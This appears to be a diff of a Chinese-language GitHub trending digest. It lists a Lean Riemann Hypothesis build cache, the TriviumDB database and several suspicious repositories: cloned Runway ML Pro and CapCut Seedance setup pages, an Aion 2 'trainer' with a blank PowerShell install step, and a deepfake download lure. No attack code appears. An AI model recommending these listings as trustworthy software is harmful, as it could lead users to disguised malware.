+    theorem LFunction_eq_zero_re_of_isPrimitive : PrimitiveDirichletLZerosOnLine := critAll
     ```
     
-    ## 用法
+    - `RiemannHypothesis` is **Mathlib's own definition** (`Mathlib/NumberTheory/LSeries/RiemannZeta.lean`, line 185 at the pinned commit), so the headline statement comes from Mathlib, outside this repository:
     
-    ```bash
-    # 列出当前账号所有可用试用
-    ./auto-trial.sh --list
-    
-    # 激活 Pro (5TB, $19.99/mo) 3个月免费试用
-    ./auto-trial.sh --product pro --dur 3mo
+      ```lean
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#10  jollykit/gta-6-localization-reference-glossary
-    ⭐ 150 stars  |  🍴 0 forks  |  💻 Rust  |  📅 2026-11-19
-    🔗 https://github.com/jollykit/gta-6-localization-reference-glossary
-    📡 来源: 🌍 本地化/多语言 | 新建 | localization i18n transl
-    🏷️ documentation, glossary, i18n, l10n, localization, multilingual, reference, terminology, translation
-    📝 Terminology reference for GTA 6 localization, compiled from public sources.
+#6  leanprover-community/riemann-hypothesis
+    ⭐ 469 stars  |  🍴 100 forks  |  💻 Lean  |  📅 2026-11-20
+    🔗 https://github.com/leanprover-community/riemann-hypothesis
+    📡 来源: 🚀 5天300+星
+    📝 Independent Comparator setup for the Lean formalization of the Riemann Hypothesis (Alpöge, 2026-11-20)
 
     README 摘要:
-    # Gta 6 Localization Reference Glossary — Deep Dive
+    # riemann-hypothesis
     
-    ### 🖥️ PowerShell Setup
+    A Comparator setup and community build cache for the Lean formalization that
+    claims a proof of the Riemann Hypothesis, and of GRH for Dirichlet L-functions, announced on
+    2026-11-20 at .
     
-      
+    The first commit, `40e56bab`, is the submitted Lean source exactly as published. Since then,
+    cleanup pull requests have removed 10,724 of its 175,187 files and edited 18; the
+    notes list them. Check out `40e56bab` for the original. This
+    repository also adds Comparator files and cache infrastructure:
     
-    Show your support
-    ETH:&nbsp;0x501DA0ad3aF5A9118d5a79Cb90BD8129b8655538
+    | File | What it is |
+    |---|---|
+    | `src/Challenge.lean` | the five theorems, stated in a file that imports only Mathlib |
+    | `comparator.json` | the Comparator config |
+    | `export-targets.txt` | the declarations to export |
+    | `verification/` | our notes, and the results once there are some |
+    | `scripts/` | public Lake cache configuration and reproducible bootstrap/publishing tools |
+    
+    ## Using the build cache
+    
+    Fetch and restore Mathlib and this project's compiled modules:
+    
+    ```bash
+    lake exe cache get
+    lake build --no-build
+    ```
+    
+    The cache settings are in `lakefile.toml`; no user configuration is needed. The first command
+    fetches both caches anonymously and extracts the oleans to `.lake/build`. It prefers a successful
+    CI build matching the current clean source, configuration, dependency manifest and toolchain;
+    documentation-only commits can reuse the same cache. Otherwise it tries the original published
+    cache. The second command checks the default build targets without compiling them. The original
+    project cache is 4.94 GB and contains portable Lean outputs and generated C. Subsequent ordinary
+    builds compile changed modules and their dependents.
+    
+    The community cache includes outputs from **untrusted pull requests and volunteer machines**.
+    Download integrity checks do not verify proofs. Use an independent fresh build when you need
+    to trust the result.
+    
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#7  pusparajpaudel155/aion-2-trainer-tool
+    ⭐ 303 stars  |  🍴 0 forks  |  💻 HTML  |  📅 2026-11-21
+    🔗 https://github.com/pusparajpaudel155/aion-2-trainer-tool
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
+    🏷️ aion-2, aion-2-2026, aion-2-game, aion-2-optimizer, aion-2-trainer, aion-2-trainer-tool, aion2-combat-analysis, aion2-meter, automation, desktop
+    📝 Aion 2 Trainer Tool: Ready-to-Run AI Prompt Engineering Setup
+
+    README 摘要:
+    # ⚡ Aion 2 Trainer Tool — Advanced AI Prompt Engineering for Windows
+    
+    ### 📦 PowerShell Install Button
+    
+       
     
     ---
     
-    The Gta 6 Localization Reference Glossary serves as a working reference for translators, editors, and reviewers handling in-game content, documenting recurring terms and their approved translations across supported languages. It is compiled from glossary material intended to keep terminology consistent in dialogue, missions, and interface text, and it flags the cases where a direct translation would misrepresent the original meaning. This guide is honest about its limits: entries reflect the current state of the source material and may lag behind late changes or omit context that only appears in the shipped game. Readers should treat the glossary as a starting point for their own review rather than a final authority on every string.
+    Aion 2 Trainer Tool delivers a complete standalone setup for Aion 2, putting advanced AI prompt engineering tools directly on your desktop with zero friction. Everything runs locally out of the box, no account juggling or extra setup rituals required. Built for players who want sharp, configurable prompt tooling without wrestling with dependencies.
     
-    ## 📋 System Requirements
+    ## ✅ Before You Start
     
     - **OS:** Windows 10 / 11
     - **Shell:** PowerShell 5.1+ or PowerShell 7+
     - **Network:** internet access to download the script
     - **Privileges:** standard user
     
-    ## How It Works
+    ## Features
     
-    This glossary operates as a structured, version-controlled reference rather than a translation tool. Each entry pairs a source term from the game with its localized equivalents across supported languages, alongside contextual notes that explain why a given rendering was chosen. Terms are organized by domain—mission names, fictional brands, character titles, UI strings, and in-world signage—so that translators and modders can locate related vocabulary without scanning an alphabetical list.
+    - **AI Prompt Engineering Suite** — a desktop-ready workspace for building, refining, and testing advanced AI prompts without leaving the app. Structured templates and live iteration keep your workflow tight.
+    - **Fully Standalone Setup** — runs on its own. No online activation, no account juggling, no dependency chain to babysit. Install it, launch it, game on.
+    - **Open-Access Build** — every capability ships unlocked out of the box. No paywalls, no tier gating, no hidden upsells between you and the tools.
+    - **Desktop-Native Performance** — tuned for Windows x64 with a lightweight footprint, so it stays out of your way while you play.
+    - **Gaming-Grade Enhancement Layer** — purpose-built boosters and modifiers that extend what the base experience gives you, with sensible defaults and clear controls.
+    - **Quick-Start Ready** — a guided first-run flow gets you from cold launch to active session in minutes, not hours.
+    - **Profile Configuration** — save, swap, and reload your setups per game or per session. One config, zero rework.
+    - **Built-In Diagnostics** — health checks and status readouts help you confirm everything is wired up correctly before you dive in.
+    - **Modular Design** — toggle individual tools on or off so the toolkit matches how you actually play.
+    - **Local-First Architecture** — your configs and session data stay on your machine. Nothing phones home unless you tell it to.
+    - **Actively Maintained** — regular polish passes keep the toolkit aligned with the current game build and desktop platform.
     
-    The underlying data is kept in plain-text, diff-friendly files. Every entry carries metadata: a stable identifier, the source language string, one or more target-language strings, part of speech, a short definition, and optional usage examples drawn from promotional material or official communications. Where a term is ambiguous or has no confirmed official translation, the entry is flagged accordingly rather than filled with speculative content. This distinction between confirmed, inferred, and unresolved terms is deliberate; the glossary does not present guesses as facts.
+    ## How it works
     
-    Entries are cross-referenced through shared tags and identifiers, allowing a term used in multiple contexts—such as a recurring brand name that appears in radio ads and on billboards—to be traced to a single canonical record. When official localization sources update or correct a prior rendering, the change is recor
+    Aion 2 Trainer Tool runs as a self-contained desktop app — no launcher dependencies, no background services, no waiting on the cloud. You point it at your game, the prompt engineering layer spins up, and you get a clean control surface tuned for Aion 2.
+    
+    **The pipeline, step by step:**
+    
+    1
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#8  Astrmira/TriviumDB
+    ⭐ 193 stars  |  🍴 14 forks  |  💻 Rust  |  📅 2026-03-26
+    🔗 https://github.com/Astrmira/TriviumDB
+    📡 来源: 🤖 AI / LLM / RAG | 活跃 | vector database embeddin
+    🏷️ agent, agent-memory, ai-agents, ann, database, embedded-database, graph, knowledge-graph, long-term-memory, memory
+    📝 A lightweight embedded database engine that natively fuses vector search, graph, and document-oriented metadata within a single storage kernel — ready to use the moment data is written.
+
+    README 摘要:
+    # TriviumDB
+    
+    **向量 × 图谱 × 文档 —— 三位一体的 AI 原生嵌入式数据库**
+    
+    **Battle-tested in mission-critical, air-gapped environments.**
+    
+    > _Trivium_：拉丁语，意为"三条道路的交汇"。
+    
+    > TriviumDB 为 Agent、RAG 和知识图谱应用提供进程内的向量、图与文档存储。宿主应用通过 Rust、Python 或 Node.js API 管理数据库实例、查询和持久化。
+    
+    **中文** | **English**
+    
+    当前正式版本为 **0.9.3**，提供可选的 Pelorus 双曲检索和 QuIVer SSD 请求级 I/O 计量，并改进 WAL 恢复、TQL 查询与图预算。完整变更、Rust 接口调整及升级步骤见双语发布说明。
+    
+    SDK 的支持范围见 SDK 正式接口清单，历史磁盘格式通过外部迁移工具升级。
+    
+    向量检索的数据选型与精确检索入口见 QuIVer 适用范围。
+    
+    ---
+    
+    ## 一句话介绍
+    
+    TriviumDB 是一个用纯 Rust 编写的**嵌入式三模数据库引擎**，将**向量检索（Vector）**、**属性图谱（Graph）**和**文档型元数据（Document）**原生融合在同一个存储内核中。Rom 将向量与 Payload 内嵌于主文件；默认 Mmap 模式分离向量与 Payload。内核将索引和登记文本集中在 `.idx`，文件组通过统一发布协议保持一致。
+    
+    我们的目标是成为 **AI 应用领域的 SQLite**：
+    
+    - 🧪 **自由 DIY 混合查询管线** —— TQL 把向量召回、属性索引、图扩展、图算法、路径、集合代数、迭代、聚合与重排变成可自由编排的算子，由确定性 Cascades 优化器统一规划
+    - 📊 **四类持久化属性索引** —— Hash / Ordered ART / Composite ART / Roaring Bitmap，等值、范围、前缀、复合条件与低基数集合运算全部索引加速
+    - 🧮 **内嵌图算法库** —— PageRank / WCC / SCC / K-Core / Articulation Points / Triangle Count / Local Clustering Coefficient / HITS / Harmonic Centrality / Node Similarity / Leiden / Betweenness / Degree / Label Propagation / SA-PPR 可在查询内直接调用，并支持 Weighted Dijkstra、Yen K-Shortest Paths、PairSet 与有界路径/集合算子
+    - 🗃️ **Rom/Mmap 双模式切换** —— Rom 内嵌向量与 Payload；Mmap 将其分离到 `.vec` 与 generation 化 `.pld.`，按需映射；完整备份使用快照 API
+    - ❄️ **Payload 冷热分层** —— 已发布 raw JSON 留在 mmap 冷基础层，新写入/更新进入内存 delta，解析结果进入有硬字节上限的 LRU Cache；ANN/BQ/Exact 候选阶段零 Payload 解析
+    - 🔗 **节点即一切** —— 每个节点天然同时拥有限定长度的稠密向量、稀疏文本倒排词频、元数据和图关系，通过全局唯一 NodeId 关联
+    - 🧠 **为 AI 而生** —— 可选启用“AC自动机+BM25稀疏文本”与“Dense Vector稠密向量”的**多路召回**来触发图谱扩散检索，并内置多层认知管线（FISTA / DPP / PPR）
+    - 🛡️ **四层数据安全保障** —— 原子替换 + WAL日志 + 事务干跑验证（Dry-Run）+ Mmap COW 隔离，`.flush_ok` v3 绑定 `.tdb/.vec/.pld`，发布前旧代备份与撤销日志支持中断恢复；备份增加磁盘读写与临时空间，损坏输入仍 fail-closed，详见恢复协议
+    - 🐍 **Python / Node.js 原生** —— `pip install` 或 `npm install` 后直接使用，类 MongoDB 查询语法
+    - ⚡ **高性能检索** —— rayon 并行暴力搜索（小规模 100% 精确）+ 自研 ANN 索引 **QuIVer**；默认采用无训练 SM-L2 导航与余弦精排，按向量工作量动态触发（209–834 节点）
+    - 💾 **SSD 友好** —— Append-Only WAL + 后台 Compaction 线程 + QuIVer 索引独立持久化，杜绝随机写入磨损
+    - 🔒 **共享只读打开** —— 多进程 Reader 共享锁并发查询已完成代际，Writer 继续保持排他锁与 WAL 安全边界
+    - 🧩 **类型化访问能力** —— Rust `DatabaseReader` 在编译期隐藏写 API，`DatabaseWriter` 保留完整嵌入式写能力
+    - 🔄 **不可变代际切换** —— `GenerationStore` 原子发布 current，跨进程 Reader 租约保护旧代安全回收，且不写入只读制品目录
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#9  Cloudcode04/runway-ml-pro-win
+    ⭐ 168 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-21
+    🔗 https://github.com/Cloudcode04/runway-ml-pro-win
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    🏷️ ai, ai-art, ai-tools, ai-writing, artificial-intelligence, generative-ai, image-generation, llm, pro, runway
+    📝 Runway - AI video generation platform for text-to-video synthesis, image animation and motion brush editing on Windows 10/11
+
+    README 摘要:
+    Runway ML Pro: AI Video Generation and Motion Editing for Windows
+    
+    A Windows reference and setup guide for the Runway ML Pro AI video platform, generative capabilities, system profile, and the first-run workflow.
+    
+      
+      
+      
+    
+      
+        
+          
+          
+        
+      
+    
+    ## Introduction
+    
+    Runway ML Pro is an AI video generation platform that lets you turn written prompts into short video clips, animate still images, and direct motion with brush-based controls on Windows 10 and 11. It is used by beginners who are exploring generative media for the first time and by professionals who need fast concept footage, storyboard previews, or stylized visual assets. Instead of a traditional timeline-first editor, it centers on generative models you guide with text and reference imagery.
+    
+    When you use Runway ML Pro, you get a set of creative tools built around text-to-video synthesis, image-to-video animation, and the Motion Brush, which lets you paint regions of a frame and define how they should move. A typical workflow starts with a prompt or a source image, moves into generation and refinement, and ends with exporting a clip you can bring into a conventional editor. The platform also includes tools for inpainting, style transfer, and camera motion so you can iterate quickly on an idea.
+    
+    In the broader generative video field, Runway ML Pro sits among the tools that made prompt-driven video accessible to non-specialists, and it continues to evolve as new models and controls are added. Its cloud-based processing means your results depend more on your connection and creative direction than on a high-end local GPU. A large community shares prompts, workflows, and tutorials, which makes it easier to learn the platform's quirks and get consistent output.
+    
+    ## System Requirements
+    
+    | Requirement | Details |
+    |-------------|---------|
+    | **Supported Windows Versions** | Windows 10, Windows 11 |
+    | **Architecture** | x64 |
+    | **Processor** | Modern dual-core or better, quad-core recommended for smooth browser and app performance |
+    | **RAM** | 8 GB minimum, 16 GB recommended |
+    | **Storage** | Around 1 GB for the desktop app plus space for downloaded clips and assets |
+    | **Permissions** | Administrative privileges may be required |
+    | **Internet Connection** | Required for activation, generation, and updates |
+    | **Dependencies** | Current Chromium-based browser or the desktop app, hardware-accelerated graphics with up-to-date drivers, DirectX 11 or later |
+    
+    To get the best performance from Runway ML
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#10  Aroralayla99/capcut-seedance-win
+    ⭐ 161 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-21
+    🔗 https://github.com/Aroralayla99/capcut-seedance-win
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    🏷️ ai-agent, ai-automation, ai-prompts, audio, capcut-exe, codex-skill, langchain, mastra, mem0, openrouter
+    📝 CapCut Seedance - AI video generation tool for text-to-video synthesis, image animation and motion effects on Windows 10/11
+
+    README 摘要:
+    CapCut Seedance: AI Video Generation Tool for Windows
+    
+    A Windows reference and setup guide for CapCut Seedance, text-to-video synthesis, image animation, and the first-run workflow.
+    
+      
+      
+      
+    
+      
+        
+          
+          
+        
+      
+    
+    ## Introduction
+    
+    CapCut Seedance is an AI video generation tool built for Windows that turns text prompts and still images into short motion clips. It is used by beginners who want to produce social-ready footage without prior editing experience, and by professionals who need fast concept previews or b-roll drafts before committing to a full production. The tool sits on the CapCut video pipeline, so what you generate can flow directly into a familiar editing timeline.
+    
+    When you use CapCut Seedance you get a prompt-driven workspace, image animation with motion controls, and a set of preset visual effects that cover common short-form styles. A typical session moves from writing a prompt or dropping in a reference image, through previewing and adjusting motion strength, to exporting a clip you can refine further. The workflow is designed to be iterative, so you can regenerate variations quickly instead of rebuilding a project from scratch.
+    
+    In the wider AI video space, Seedance represents the growing class of consumer-facing synthesis tools that blend generative models with a conventional editor. Its value comes from that combination: the model provides the raw motion, and the editor gives you control over timing, framing, and delivery. The community around CapCut tutorials, prompt-sharing threads, and template packs continues to expand, and the underlying models evolve with each release.
+    
+    ## System Requirements
+    
+    | Requirement | Details |
+    |-------------|---------|
+    | **Supported Windows Versions** | Windows 10, Windows 11 |
+    | **Architecture** | x64 |
+    | **Processor** | Intel Core i5 (10th gen or newer) or AMD Ryzen 5 equivalent; Core i7 / Ryzen 7 recommended |
+    | **RAM** | 8 GB minimum / 16 GB or more recommended |
+    | **Storage** | 4 GB for installation plus 10 GB or more for generated clips and cache |
+    | **Permissions** | Administrative privileges may be required |
+    | **Internet Connection** | Required for activation and updates |
+    | **Dependencies** | DirectX 11 or newer, Visual C++ Redistributable, current GPU driver with hardware video encoding support |
+    
+    For the smoothest experience, pair CapCut Seedance with a discrete GPU that has at least 6 GB of video memory and a recent driver, since generation and rendering both lean heavily on GPU ac
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#11  JieFedorov81/runway-ml-pro-win
+    ⭐ 160 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-21
+    🔗 https://github.com/JieFedorov81/runway-ml-pro-win
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    🏷️ ai, ai-art, ai-tools, ai-writing, artificial-intelligence, generative-ai, image-generation, llm, pro, runway
+    📝 Runway - AI video generation platform for text-to-video synthesis, image animation and motion brush editing on Windows 10/11
+
+    README 摘要:
+    Runway ML Pro: AI Video Generation and Motion Editing for Windows
+    
+    A Windows reference and setup guide for the Runway ML Pro AI video platform, generative capabilities, system profile, and the first-run workflow.
+    
+      
+      
+      
+    
+      
+        
+          
+          
+        
+      
+    
+    ## Introduction
+    
+    Runway ML Pro is an AI video generation platform that lets you turn written prompts into short video clips, animate still images, and direct motion with brush-based controls on Windows 10 and 11. It is used by beginners who are exploring generative media for the first time and by professionals who need fast concept footage, storyboard previews, or stylized visual assets. Instead of a traditional timeline-first editor, it centers on generative models you guide with text and reference imagery.
+    
+    When you use Runway ML Pro, you get a set of creative tools built around text-to-video synthesis, image-to-video animation, and the Motion Brush, which lets you paint regions of a frame and define how they should move. A typical workflow starts with a prompt or a source image, moves into generation and refinement, and ends with exporting a clip you can bring into a conventional editor. The platform also includes tools for inpainting, style transfer, and camera motion so you can iterate quickly on an idea.
+    
+    In the broader generative video field, Runway ML Pro sits among the tools that made prompt-driven video accessible to non-specialists, and it continues to evolve as new models and controls are added. Its cloud-based processing means your results depend more on your connection and creative direction than on a high-end local GPU. A large community shares prompts, workflows, and tutorials, which makes it easier to learn the platform's quirks and get consistent output.
+    
+    ## System Requirements
+    
+    | Requirement | Details |
+    |-------------|---------|
+    | **Supported Windows Versions** | Windows 10, Windows 11 |
+    | **Architecture** | x64 |
+    | **Processor** | Modern dual-core or better, quad-core recommended for smooth browser and app performance |
+    | **RAM** | 8 GB minimum, 16 GB recommended |
+    | **Storage** | Around 1 GB for the desktop app plus space for downloaded clips and assets |
+    | **Permissions** | Administrative privileges may be required |
+    | **Internet Connection** | Required for activation, generation, and updates |
+    | **Dependencies** | Current Chromium-based browser or the desktop app, hardware-accelerated graphics with up-to-date drivers, DirectX 11 or later |
+    
+    To get the best performance from Runway ML
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#12  josephyoung28/capcut-seedance-win
+    ⭐ 148 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-21
+    🔗 https://github.com/josephyoung28/capcut-seedance-win
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    🏷️ ai-agent, ai-automation, ai-prompts, audio, capcut-exe, codex-skill, langchain, mastra, mem0, openrouter
+    📝 CapCut Seedance - AI video generation tool for text-to-video synthesis, image animation and motion effects on Windows 10/11
+
+    README 摘要:
+    CapCut Seedance: AI Video Generation Tool for Windows
+    
+    A Windows reference and setup guide for CapCut Seedance, text-to-video synthesis, image animation, and the first-run workflow.
+    
+      
+      
+      
+    
+      
+        
+          
+          
+        
+      
+    
+    ## Introduction
+    
+    CapCut Seedance is an AI video generation tool built for Windows that turns text prompts and still images into short motion clips. It is used by beginners who want to produce social-ready footage without prior editing experience, and by professionals who need fast concept previews or b-roll drafts before committing to a full production. The tool sits on the CapCut video pipeline, so what you generate can flow directly into a familiar editing timeline.
+    
+    When you use CapCut Seedance you get a prompt-driven workspace, image animation with motion controls, and a set of preset visual effects that cover common short-form styles. A typical session moves from writing a prompt or dropping in a reference image, through previewing and adjusting motion strength, to exporting a clip you can refine further. The workflow is designed to be iterative, so you can regenerate variations quickly instead of rebuilding a project from scratch.
+    
+    In the wider AI video space, Seedance represents the growing class of consumer-facing synthesis tools that blend generative models with a conventional editor. Its value comes from that combination: the model provides the raw motion, and the editor gives you control over timing, framing, and delivery. The community around CapCut tutorials, prompt-sharing threads, and template packs continues to expand, and the underlying models evolve with each release.
+    
+    ## System Requirements
+    
+    | Requirement | Details |
+    |-------------|---------|
+    | **Supported Windows Versions** | Windows 10, Windows 11 |
+    | **Architecture** | x64 |
+    | **Processor** | Intel Core i5 (10th gen or newer) or AMD Ryzen 5 equivalent; Core i7 / Ryzen 7 recommended |
+    | **RAM** | 8 GB minimum / 16 GB or more recommended |
+    | **Storage** | 4 GB for installation plus 10 GB or more for generated clips and cache |
+    | **Permissions** | Administrative privileges may be required |
+    | **Internet Connection** | Required for activation and updates |
+    | **Dependencies** | DirectX 11 or newer, Visual C++ Redistributable, current GPU driver with hardware video encoding support |
+    
+    For the smoothest experience, pair CapCut Seedance with a discrete GPU that has at least 6 GB of video memory and a recent driver, since generation and rendering both lean heavily on GPU ac
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#13  emilioevans/runway-ml-pro-win
+    ⭐ 144 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-21
+    🔗 https://github.com/emilioevans/runway-ml-pro-win
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    📝 Runway - AI video generation platform for text-to-video synthesis, image animation and motion brush editing on Windows 10/11
+
+    README 摘要:
+    (README 获取失败)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#14  KPVADALIYA/DeepAI-For-Fake-PC
+    ⭐ 64 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-11-17
+    🔗 https://github.com/KPVADALIYA/DeepAI-For-Fake-PC
+    📡 来源: 🤖 AI / LLM / RAG | 新建 | AI image generation
+    🏷️ ai-avatar, ai-face-replacement, character-swap, deep-live-cam, deep-live-cam-api, deepfacelab, deepfake-detection, deeptrace, face-restoration, faceforensics
+    📝 AI-powered media creation tool for image and video transformation, synthetic media generation, and advanced visual effects.
+
+    README 摘要:
+    # 🎭 DeepFake AI — AI-Powered Media Creation
+    
+    DeepFake AI is an artificial intelligence-based media creation tool designed to explore modern image and video manipulation technologies. It combines AI-powered processing with digital media customization, allowing users to experiment with visual transformations and create engaging multimedia content.
+    
+    From image-based effects to advanced video processing, the technology behind DeepFake AI demonstrates how artificial intelligence can be used to transform and enhance digital media.
+    
+    Whether you're interested in AI technology, digital creativity, or multimedia experimentation, this project provides an introduction to some of the possibilities offered by modern generative AI.
+    
+    ## 📌 Overview
+    
+    Artificial intelligence is changing the way digital images and videos are created, edited, and processed. Tasks that once required specialized software and considerable editing experience can now be explored through AI-powered tools.
+    
+    DeepFake AI focuses on AI-assisted media transformation. Depending on the supported models and available functionality, users can work with visual inputs, experiment with different processing options, and explore various media-generation techniques.
+    
+    The project is intended for users interested in understanding and experimenting with AI-based visual technologies.
+    
+    ## 📥 Download
+    
+    Ready to explore AI-powered media processing?
+    
+    Visit the download page below to access the available project files, documentation, and setup instructions.
+    
+    **Download:** GET DEEPFAKE AI
+    
+    ## 🚀 Main Features
+    
+    ### 🧠 AI-Powered Processing
+    Use artificial intelligence to analyze and process visual media. AI-based models can recognize visual patterns and apply transformations according to the selected processing method.
+    
+    ### 🖼️ Image Transformation
+    Explore image-processing capabilities and AI-assisted visual modifications. Supported operations may include facial feature processing, image enhancement, and visual adjustments.
+    
+    ### 🎬 Video Processing
+    Work with video content using supported AI processing methods. Depending on the implementation, processing options may include frame analysis, visual transformations, and media export.
+    
+    ### ⚙️ Customization & Settings
+    Configure available processing parameters to influence the final output. Depending on the model, options may include resolution, quality, processing preferences, and output formats.
+    
+    ### ✨ AI Technology Exploration
+    Experiment with modern generative AI concepts and learn ho
